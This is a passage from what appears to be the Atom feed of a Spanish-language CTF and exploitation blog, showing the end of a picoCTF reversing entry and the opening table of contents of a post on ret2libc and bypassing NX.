+&lt;font size=&quot;1&quot;&gt; ijaesuperramadre Kamiya esta bien guapa&lt;/font&gt;</content><author><name>c4rta</name></author><category term="picoCTF" /><category term="Reversing" /><category term="radare2" /><summary type="html">Resolveremos un pequeño ejercicio de reversing de picoCTF</summary></entry><entry><title type="html">ret2libc bypass NX</title><link href="http://localhost:4000/ret2libc/" rel="alternate" type="text/html" title="ret2libc bypass NX" /><published>2022-07-29T00:00:00-05:00</published><updated>2022-07-29T00:00:00-05:00</updated><id>http://localhost:4000/ret2libc</id><content type="html" xml:base="http://localhost:4000/ret2libc/">&lt;h2 id=&quot;contenido&quot;&gt;Contenido&lt;/h2&gt;
 &lt;ul&gt;
   &lt;li&gt;¿Que es ret2libc?.&lt;/li&gt;
   &lt;li&gt;¿Que es No Executable (NX)?.&lt;/li&gt;
